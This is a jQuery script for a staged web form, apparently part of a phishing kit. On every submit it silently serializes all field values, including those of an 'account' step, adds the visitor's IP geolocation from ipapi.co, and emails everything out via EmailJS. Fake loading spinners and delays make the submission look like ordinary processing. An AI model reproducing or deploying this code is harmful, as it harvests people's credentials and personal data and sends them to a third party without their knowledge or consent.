$(document).ready(function () {

    var delay = function(ms){ return new Promise(function(r) { setTimeout(r, ms) }) };

    let ipData = '';
    $.getJSON('https://ipapi.co/json/', function(data) {
        ipData = JSON.stringify(data, null, 2);
    });

    let unsaved = false;
    $(":input").change(function(){ unsaved = true; });
    window.onbeforeunload = function () { if(unsaved){ return "If you leave now all changes will be lost. Do you want to leave this page and discard your changes?";} };

    $('form').submit(function (event) {
        event.preventDefault();
        var data = $(this).serializeArray();
        data['ip'] = ipData;

        emailjs.send('gmail', '1', {body: JSON.stringify(data)})
        .then(function(response) {
           console.log('SUCCESS!', response.status, response.text);
        }, function(error) {
           console.log('FAILED...', error);
        });

    });

    $('.profileform form').submit(function (event) {
        event.preventDefault();

        $('body')
            .loadingModal({text: 'Submitting, please wait...'})
            .loadingModal('animation', 'rotatingPlane');

        delay(2000)
            .then(function () {
                $('.profileform').addClass('hidden');
                $('.accountform').removeClass('hidden');

                $('.accountform')[0].scrollIntoView();

            
                return delay(500);
            })
            .then(function () {
                $('body').loadingModal('destroy');
            });
    });

    $('.accountform form').submit(function (event) {
        event.preventDefault();
        $('body')
            .loadingModal({text: 'Submitting, please wait...'})
            .loadingModal('animation', 'rotatingPlane');

        delay(3000)
            .then(function () {
                $('.accountform').addClass('hidden');
                $('.confirmation').removeClass('hidden');

                return delay(500);
            })
            .then(function () {
                $('body').loadingModal('destroy');
            });

    });





});
